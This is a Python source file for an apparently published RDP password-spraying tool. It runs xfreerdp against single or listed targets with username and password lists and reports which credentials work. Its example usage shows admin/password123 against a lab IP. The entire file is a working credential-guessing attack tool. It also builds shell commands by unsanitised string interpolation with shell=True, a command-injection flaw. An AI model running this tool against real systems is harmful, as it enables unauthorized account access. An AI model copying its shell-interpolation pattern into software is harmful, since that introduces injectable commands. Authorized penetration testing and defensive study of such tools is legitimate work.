#!/usr/bin/env python3
import argparse
from sys import exit,argv
from textwrap import dedent
from termcolor import colored
from datetime import datetime
from colorama import Fore, Style
from subprocess import Popen,PIPE


def print_banner():
    print(Fore.GREEN + Style.BRIGHT + "")
    print("         _       _____                                     ")
    print("        | |     /  ___|                                    ")
    print(" _ __ __| |_ __ \ `--. _ __  _ __ __ _ _   _   _ __  _   _ ") 
    print("| '__/ _` | '_ \ `--. \ '_ \| '__/ _` | | | | | '_ \| | | |")
    print("| | | (_| | |_) /\__/ / |_) | | | (_| | |_| |_| |_) | |_| |")
    print("|_|  \__,_| .__/\____/| .__/|_|  \__,_|\__, (_) .__/ \__, |")
    print("          | |         | |               __/ | | |     __/ |")
    print("          |_|         |_|              |___/  |_|    |___/\n")
    print("                                   v1.0      @rootshooter\n")
    print("             A RDP Password Spraying Utility              " + Style.RESET_ALL)
    print("=" * 60)

def print_warning(msg):
    print(colored(f"[!] {msg}", "yellow", attrs=["bold"]))

def print_success(msg):
    print(colored(f"[+] {msg}", "green", attrs=["bold"]))

def print_fail(msg):
    print(colored(f"[-] {msg}", "red", attrs=["bold"]))

def print_info(msg):
    print(colored(f"[*] {msg}", "cyan", attrs=["bold"]))

def print_stime():
    timest = datetime.now()
    global stime
    stime = timest.strftime("%d-%b-%Y [%H:%M:%S]")
    print_warning(f"Attack Started: {stime}")

def print_etime():
    timen = datetime.now()
    global etime
    etime = timen.strftime("%d-%b-%Y [%H:%M:%S]")
    print_warning(f"Attack Finished: {etime}")

global success
success = b"Authentication only, exit status 0"
global fail
fail = b"ERRCONNECT_LOGON_FAILURE"
global conn_fail
conn_fail = b"0x00020006"
global conn_refuse
conn_refuse = b"ERRCONNECT_CONNECT_TRANSPORT_FAILED"

def single_user():
    if args.password:
        user = args.user
        password = args.password
        port = args.connect or 3389
        target = args.target
        print_info(f"Attempting --> {user}:{password} on rdp://{target}:{port}")
        cmd = f"xfreerdp /u:{user} /p:{password} /v:{target}:{port} /cert:ignore +auth-only /sec:nla"
        sys_conn = Popen([cmd], shell=True, stdout=PIPE, stderr=PIPE)
        sys_resp = sys_conn.stderr.read()
        if (conn_fail in sys_resp):
            print_fail(f"Failed to connect to rdp://{target}:{port}")
        elif (conn_refuse in sys_resp):
            print_fail(f"Failed to connect to rdp://{target}:{port}")
        elif (fail in sys_resp):
            print_fail(f"{user}:{password} on rdp://{target}:{port} is INCORRECT")
        elif (success in sys_resp):
            print_success(f"{user}:{password} on rdp://{target}:{port} is CORRECT!")
        else:
            print_fail("Unknown response code")
            print(sys_resp)
            exit()
    elif args.passlist:
        user = args.user
        passlist = args.passlist
        port = args.connect or 3389
        target = args.target
        with open(passlist, 'r') as passlist:
            for line in passlist:
                try:
                    password = line.strip("\n")
                    print_info(f"Attempting --> {user}:{password} on rdp://{target}:{port}")
                    cmd = f"xfreerdp /u:{user} /p:{password} /v:{target}:{port} /cert:ignore +auth-only /sec:nla"
                    sys_conn = Popen([cmd], shell=True, stdout=PIPE, stderr=PIPE)
                    sys_resp = sys_conn.stderr.read()
                    if (conn_fail in sys_resp):
                        print_fail(f"Failed to connect to rdp://{target}:{port}")
                    elif (conn_refuse in sys_resp):
                        print_fail(f"Failed to connect to rdp://{target}:{port}")
                    elif (fail in sys_resp):
                        print_fail(f"{user}:{password} on rdp://{target}:{port} is INCORRECT")
                    elif (success in sys_resp):
                        print_success(f"{user}:{password} on rdp://{target}:{port} is CORRECT!")
                    else:
                        print_fail("Unknown response code")
                        print(sys_resp)
                        exit()
                except KeyboardInterrupt:
                    print_fail("Exiting")
                    exit()
                except Exception as error:
                    print_fail(f"{error}")
                    exit()

def multi_user():
    if args.password:
        userlist = args.userlist
        password = args.password
        port = args.connect or 3389
        target = args.target
        with open(userlist, 'r') as userlist:
            for line in userlist:
                user = line.strip("\n")
                print_info(f"Attempting --> {user}:{password} on rdp://{target}:{port}")
                cmd = f"xfreerdp /u:{user} /p:{password} /v:{target}:{port} /cert:ignore +auth-only /sec:nla"
                sys_conn = Popen([cmd], shell=True, stdout=PIPE, stderr=PIPE)
                sys_resp = sys_conn.stderr.read()
                if (conn_fail in sys_resp):
                    print_fail(f"Failed to connect to rdp://{target}:{port}")
                elif (conn_refuse in sys_resp):
                    print_fail(f"Failed to connect to rdp://{target}:{port}")
                elif (fail in sys_resp):
                    print_fail(f"{user}:{password} on rdp://{target}:{port} is INCORRECT")
                elif (success in sys_resp):
                    print_success(f"{user}:{password} on rdp://{target}:{port} is CORRECT!")
                else:
                    print_fail("Unknown response code")
                    print(sys_resp)
                    exit()
    elif args.passlist:
        userlist = args.userlist
        passlist = args.passlist
        port = args.connect or 3389
        target = args.target
        # Shout out to Cory Billington for the help!
        with open(userlist, 'r') as userlist, open(passlist, 'r') as passlist:
            while user:= userlist.readline().rstrip():
                while password := passlist.readline().rstrip():
                        print_info(f"Attempting --> {user}:{password} on rdp://{target}:{port}")
                        cmd = f"xfreerdp /u:{user} /p:{password} /v:{target}:{port} /cert:ignore +auth-only /sec:nla"
                        sys_conn = Popen([cmd], shell=True, stdout=PIPE, stderr=PIPE)
                        sys_resp = sys_conn.stderr.read()
                        if (conn_fail in sys_resp):
                            print_fail(f"Failed to connect to rdp://{target}:{port}")
                        elif (conn_refuse in sys_resp):
                            print_fail(f"Failed to connect to rdp://{target}:{port}")
                        elif (fail in sys_resp):
                            print_fail(f"{user}:{password} on rdp://{target}:{port} is INCORRECT")
                        elif (success in sys_resp):
                            print_success(f"{user}:{password} on rdp://{target}:{port} is CORRECT!")
                        else:
                            print_fail("Unknown response code")
                            print(sys_resp)
                            exit()
                passlist.seek(0)

def multi_target():
    if args.user:
        if args.password:
            user = args.user
            password = args.password
            port = args.connect or 3389
            targetlist = args.targetlist
            with open(targetlist, 'r') as targetlist:
                for line in targetlist:
                    target = line.rstrip()
                    print_info(f"Attempting --> {user}:{password} on rdp://{target}:{port}")
                    cmd = f"xfreerdp /u:{user} /p:{password} /v:{target}:{port} /cert:ignore +auth-only /sec:nla"
                    sys_conn = Popen([cmd], shell=True, stdout=PIPE, stderr=PIPE)
                    sys_resp = sys_conn.stderr.read()
                    if (conn_fail in sys_resp):
                        print_fail(f"Failed to connect to rdp://{target}:{port}")
                    elif (conn_refuse in sys_resp):
                        print_fail(f"Failed to connect to rdp://{target}:{port}")
                    elif (fail in sys_resp):
                        print_fail(f"{user}:{password} on rdp://{target}:{port} is INCORRECT")
                    elif (success in sys_resp):
                        print_success(f"{user}:{password} on rdp://{target}:{port} is CORRECT!")
                    else:
                        print_fail("Unknown response code")
                        print(sys_resp)
                        exit()
        elif args.passlist:
            user = args.user
            passlist = args.passlist
            port = args.connect or 3389
            targetlist = args.targetlist
            with open(targetlist, 'r') as targetlist, open(passlist, 'r') as passlist:
                while target := targetlist.readline().rstrip():
                    while password := passlist.readline().rstrip():
                        print_info(f"Attempting --> {user}:{password} on rdp://{target}:{port}")
                        cmd = f"xfreerdp /u:{user} /p:{password} /v:{target}:{port} /cert:ignore +auth-only /sec:nla"
                        sys_conn = Popen([cmd], shell=True, stdout=PIPE, stderr=PIPE)
                        sys_resp = sys_conn.stderr.read()                           
                        if (conn_fail in sys_resp):
                            print_fail(f"Failed to connect to rdp://{target}:{port}")
                        elif (conn_refuse in sys_resp):
                            print_fail(f"Failed to connect to rdp://{target}:{port}")
                        elif (fail in sys_resp):
                            print_fail(f"{user}:{password} on rdp://{target}:{port} is INCORRECT")
                        elif (success in sys_resp):
                            print_success(f"{user}:{password} on rdp://{target}:{port} is CORRECT!")
                        else:
                            print_fail("Unknown response code")
                            print(sys_resp)
                            exit()
                    passlist.seek(0)
        else:
            print_fail("Unexpected error! Exiting...")
            exit()
    elif args.userlist:
        if args.password:
            userlist = args.userlist
            password = args.password
            port = args.connect or 3389
            targetlist = args.targetlist
            with open(targetlist, 'r') as targetlist, open(userlist, 'r') as userlist:
                while target := targetlist.readline().rstrip():
                    while user := userlist.readline().rstrip():
                        print_info(f"Attempting --> {user}:{password} on rdp://{target}:{port}")
                        cmd = f"xfreerdp /u:{user} /p:{password} /v:{target}:{port} /cert:ignore +auth-only /sec:nla"
                        sys_conn = Popen([cmd], shell=True, stdout=PIPE, stderr=PIPE)
                        sys_resp = sys_conn.stderr.read()                   
                        if (conn_fail in sys_resp):
                            print_fail(f"Failed to connect to rdp://{target}:{port}")
                        elif (conn_refuse in sys_resp):
                            print_fail(f"Failed to connect to rdp://{target}:{port}")
                        elif (fail in sys_resp):
                            print_fail(f"{user}:{password} on rdp://{target}:{port} is INCORRECT")
                        elif (success in sys_resp):
                            print_success(f"{user}:{password} on rdp://{target}:{port} is CORRECT!")
                        else:
                            print_fail("Unknown response code")
                            print(sys_resp)
                            exit()
                    userlist.seek(0)
                targetlist.seek(0)
        elif args.passlist:
            userlist = args.userlist
            passlist = args.passlist
            port = args.connect or 3389
            targetlist = args.targetlist
            with open(targetlist, 'r') as targetlist, open(userlist, 'r') as userlist, open(passlist, 'r') as passlist:
                while target := targetlist.readline().rstrip():
                    while user := userlist.readline().rstrip():
                        while password := passlist.readline().rstrip():
                            print_info(f"Attempting --> {user}:{password} on rdp://{target}:{port}")
                            cmd = f"xfreerdp /u:{user} /p:{password} /v:{target}:{port} /cert:ignore +auth-only /sec:nla"
                            sys_conn = Popen([cmd], shell=True, stdout=PIPE, stderr=PIPE)
                            sys_resp = sys_conn.stderr.read()                               
                            if (conn_fail in sys_resp):
                                print_fail(f"Failed to connect to rdp://{target}:{port}")
                            elif (conn_refuse in sys_resp):
                                print_fail(f"Failed to connect to rdp://{target}:{port}")
                            elif (fail in sys_resp):
                                print_fail(f"{user}:{password} on rdp://{target}:{port} is INCORRECT")
                            elif (success in sys_resp):
                                print_success(f"{user}:{password} on rdp://{target}:{port} is CORRECT!")
                            else:
                                print_fail("Unknown response code")
                                print(sys_resp)
                                exit()
                        passlist.seek(0)
                    userlist.seek(0)
                targetlist.seek(0)
        else:
            print_fail("Unexpected error! Exiting...")
            exit()
    else:
        print_fail("Unexpected error! Exiting...")
        exit()  

def main():
    if args.target:
        try:
            print_banner()
            print_stime()
            if args.user:
                single_user()
                print_etime()
            elif args.userlist:
                multi_user()
                print_etime()
            else:
               print_fail("Unexpected error! Exiting...")
               print_etime()
               exit() 
        except KeyboardInterrupt:
            print_fail("Exiting")
            print_etime()
            exit()
        except Exception as error:
            print_fail(f"{error}")
            print_etime()
            exit()
    elif args.targetlist:
        try:
            print_banner()
            print_stime()
            multi_target()
            print_etime()
        except KeyboardInterrupt:
            print_fail("Exiting")
            print_etime()
            exit()
        except Exception as error:
            print_fail(f"{error}")
            print_etime()
            exit()
    else:
        print_fail("Unexpected error! Exiting...")
        print_etime()
        exit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RDP Password Spraying Utility", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent(f'''
    EXAMPLE COMMANDS:
    {argv[0]} <target(s)> <port> <username(s)> <password(s)>
    {argv[0]} -t 10.10.110.112 -c 3389 -u admin -p password123
    {argv[0]} --target 10.10.110.112 --connect 3389 --user admin --password password123
    {argv[0]} -t 10.10.110.112 -c 3389 -U users.txt -P passwords.txt
    {argv[0]} --target 10.10.110.112 --connect 3389 --userlist users.txt --passlist passwords.txt
    {argv[0]} -T targets.txt -c 3389 -u admin -p password123
    {argv[0]} --targetlist targets.txt --connect 3389 --user admin --password password123
    {argv[0]} -T targets.txt -c 3389 -U users.txt -P passwords.txt
    {argv[0]} --targetlist targets.txt --connect 3389 --userlist users.txt --passlist passwords.txt
'''))
    parser.add_argument('-t', '--target', help='Target IP address')
    parser.add_argument('-T', '--targetlist', help='Target address list')
    parser.add_argument('-c', '--connect', type=int, default=3389, help='Target RDP port')
    parser.add_argument('-u', '--user', help='Target username')
    parser.add_argument('-U', '--userlist', help='Target username list')
    parser.add_argument('-p', '--password', help='Target password')
    parser.add_argument('-P', '--passlist', help='Target password list')
    global args
    args = parser.parse_args()
    if len(argv) == 1:
        parser.print_help()
        parser.exit()
    else:
        main()
